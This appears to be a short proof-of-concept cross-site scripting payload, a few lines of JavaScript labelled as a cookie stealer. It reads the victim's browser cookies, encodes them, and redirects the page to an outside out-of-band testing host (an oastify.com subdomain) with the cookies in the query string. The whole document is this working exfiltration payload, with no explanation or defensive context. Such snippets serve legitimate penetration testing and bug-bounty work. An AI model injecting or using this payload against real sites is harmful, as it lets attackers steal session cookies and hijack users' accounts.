// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://87desdhfnzdwwycnwr2rm7sj7ad11sph.oastify.com/?victim_cookie=' + cookie;
window.location.href = url;
